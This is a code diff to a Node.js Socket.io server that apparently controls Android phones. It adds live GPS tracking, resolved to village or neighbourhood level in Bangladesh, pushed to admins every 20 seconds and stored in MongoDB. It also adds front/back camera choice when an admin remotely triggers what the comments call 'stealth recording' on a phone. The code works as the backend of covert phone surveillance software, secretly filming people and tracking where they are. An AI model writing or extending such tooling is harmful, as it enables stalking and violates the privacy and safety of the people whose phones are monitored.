@@ -16,6 +16,7 @@ const deviceRoutes = require('./routes/deviceRoutes');
 const videoRoutes = require('./routes/videoRoutes');
 const adminRoutes = require('./routes/adminRoutes');
 const Device = require('./models/Device');
+const { resolveVillageOrPara } = require('./utils/geoCoder');
 
 const app = express();
 const server = http.createServer(app);
@@ -59,10 +60,31 @@ app.use('/api/admin', adminRoutes);
 // Socket.io Real-Time Live Streaming & Command Events
 io.on('connection', (socket) => {
   // Device registration from Android phone
-  socket.on('register-device', async ({ deviceId, deviceName, batteryLevel }) => {
+  socket.on('register-device', async (data) => {
+    if (!data || !data.deviceId) return;
+    let { deviceId, deviceName, batteryLevel, latitude, longitude, locationName, villageOrPara, districtAndCountry } = data;
     socket.join(`device_${deviceId}`);
     socket.join('devices');
     const now = new Date();
+
+    // High precision Village / Para resolution if coordinates exist
+    if (latitude && longitude) {
+      const isGeneric = !villageOrPara ||
+        ['dhaka', 'chittagong', 'chattogram', 'sylhet', 'rajshahi', 'khulna', 'barishal', 'rangpur'].includes(villageOrPara.toLowerCase().trim());
+      if (isGeneric) {
+        try {
+          const resolved = await resolveVillageOrPara(latitude, longitude);
+          if (resolved && resolved.villageOrPara) {
+            villageOrPara = resolved.villageOrPara;
+            if (resolved.districtAndCountry) districtAndCountry = resolved.districtAndCountry;
+            if (resolved.locationName) locationName = resolved.locationName;
+          }
+        } catch (e) {
+          // ignore
+        }
+      }
+    }
+
     connectedDevices.set(deviceId, {
       socketId: socket.id,
       deviceId,
@@ -70,38 +92,86 @@ io.on('connection', (socket) => {
       batteryLevel: batteryLevel !== undefined ? batteryLevel : 100,
       isStreaming: false,
       lastSeen: now,
+      latitude: latitude ? Number(latitude) : null,
+      longitude: longitude ? Number(longitude) : null,
+      locationName: locationName || '',
+      villageOrPara: villageOrPara || '',
+      districtAndCountry: districtAndCountry || '',
+      locationUpdatedAt: latitude ? now : undefined,
     });
     socketToDevice.set(socket.id, deviceId);
-    console.log(`📱 Device registered on Socket: ${deviceId} (${deviceName || 'Android'})`);
+    console.log(`📱 Device registered on Socket: ${deviceId} (${deviceName || 'Android'}) [📍 ${villageOrPara || locationName || 'Locating...'}]`);
 
-    // Keep MongoDB lastSeen up to date
+    // Keep MongoDB lastSeen & location up to date
     try {
       await Device.findOneAndUpdate(
         { deviceId },
-        { lastSeen: now, ...(batteryLevel !== undefined ? { batteryLevel } : {}) }
+        {
+          lastSeen: now,
+          ...(batteryLevel !== undefined ? { batteryLevel } : {}),
+          ...(latitude ? { latitude: Number(latitude), locationUpdatedAt: now } : {}),
+          ...(longitude ? { longitude: Number(longitude) } : {}),
+          ...(locationName ? { locationName } : {}),
+          ...(villageOrPara ? { villageOrPara } : {}),
+          ...(districtAndCountry ? { districtAndCountry } : {}),
+        },
+        { upsert: true }
       );
     } catch (e) {
       console.error('Error updating device lastSeen on register:', e.message);
     }
 
-    // Notify admins that this device is live
+    // Notify admins that this device is live with real-time location
     io.to('admins').emit('device-status-change', {
       deviceId,
       isOnline: true,
       lastSeen: now,
       batteryLevel: batteryLevel !== undefined ? batteryLevel : 100,
+      latitude: latitude ? Number(latitude) : undefined,
+      longitude: longitude ? Number(longitude) : undefined,
+      locationName: locationName || undefined,
+      villageOrPara: villageOrPara || undefined,
+      districtAndCountry: districtAndCountry || undefined,
+      locationUpdatedAt: latitude ? now : undefined,
     });
   });
 
-  // Device periodic heartbeat (every 20s from phone)
-  socket.on('device-heartbeat', async ({ deviceId, batteryLevel, isRecording }) => {
-    if (!deviceId) return;
+  // Device periodic heartbeat (every 20s from phone) with real-time GPS
+  socket.on('device-heartbeat', async (data) => {
+    if (!data || !data.deviceId) return;
+    let { deviceId, batteryLevel, isRecording, latitude, longitude, locationName, villageOrPara, districtAndCountry } = data;
     const now = new Date();
+
+    if (latitude && longitude) {
+      const isGeneric = !villageOrPara ||
+        ['dhaka', 'chittagong', 'chattogram', 'sylhet', 'rajshahi', 'khulna', 'barishal', 'rangpur'].includes(villageOrPara.toLowerCase().trim());
+      if (isGeneric) {
+        try {
+          const resolved = await resolveVillageOrPara(latitude, longitude);
+          if (resolved && resolved.villageOrPara) {
+            villageOrPara = resolved.villageOrPara;
+            if (resolved.districtAndCountry) districtAndCountry = resolved.districtAndCountry;
+            if (resolved.locationName) locationName = resolved.locationName;
+          }
+        } catch (e) {
+          // ignore
+        }
+      }
+    }
+
     const dev = connectedDevices.get(deviceId);
     if (dev) {
       dev.lastSeen = now;
       if (batteryLevel !== undefined) dev.batteryLevel = batteryLevel;
       if (isRecording !== undefined) dev.isRecording = Boolean(isRecording);
+      if (latitude) {
+        dev.latitude = Number(latitude);
+        dev.locationUpdatedAt = now;
+      }
+      if (longitude) dev.longitude = Number(longitude);
+      if (locationName) dev.locationName = locationName;
+      if (villageOrPara) dev.villageOrPara = villageOrPara;
+      if (districtAndCountry) dev.districtAndCountry = districtAndCountry;
     }
 
     try {
@@ -111,6 +181,11 @@ io.on('connection', (socket) => {
           lastSeen: now,
           ...(batteryLevel !== undefined ? { batteryLevel } : {}),
           ...(isRecording !== undefined ? { isRecording: Boolean(isRecording) } : {}),
+          ...(latitude ? { latitude: Number(latitude), locationUpdatedAt: now } : {}),
+          ...(longitude ? { longitude: Number(longitude) } : {}),
+          ...(locationName ? { locationName } : {}),
+          ...(villageOrPara ? { villageOrPara } : {}),
+          ...(districtAndCountry ? { districtAndCountry } : {}),
         }
       );
     } catch (e) {
@@ -122,6 +197,12 @@ io.on('connection', (socket) => {
       lastSeen: now,
       batteryLevel,
       isRecording: Boolean(isRecording),
+      latitude: latitude ? Number(latitude) : undefined,
+      longitude: longitude ? Number(longitude) : undefined,
+      locationName: locationName || undefined,
+      villageOrPara: villageOrPara || undefined,
+      districtAndCountry: districtAndCountry || undefined,
+      locationUpdatedAt: latitude ? now : undefined,
       isOnline: true,
     });
   });
@@ -196,13 +277,14 @@ io.on('connection', (socket) => {
   });
 
   // Admin remotely triggers stealth recording on phone
-  socket.on('start-remote-recording', async ({ deviceId }) => {
-    console.log(`⏺️ Remote recording requested for: ${deviceId}`);
+  socket.on('start-remote-recording', async ({ deviceId, camera }) => {
+    const lens = camera === 'FRONT' ? 'FRONT' : 'BACK';
+    console.log(`⏺️ Remote recording requested for: ${deviceId} with lens: ${lens}`);
     try {
-      await Device.findOneAndUpdate({ deviceId }, { isRecording: true });
+      await Device.findOneAndUpdate({ deviceId }, { isRecording: true, cameraLens: lens });
     } catch (e) {}
-    io.to(`device_${deviceId}`).emit('start-remote-recording');
-    io.to('admins').emit('device-recording-status', { deviceId, isRecording: true });
+    io.to(`device_${deviceId}`).emit('start-remote-recording', { camera: lens });
+    io.to('admins').emit('device-recording-status', { deviceId, isRecording: true, camera: lens });
   });
 
   // Admin remotely stops stealth recording on phone
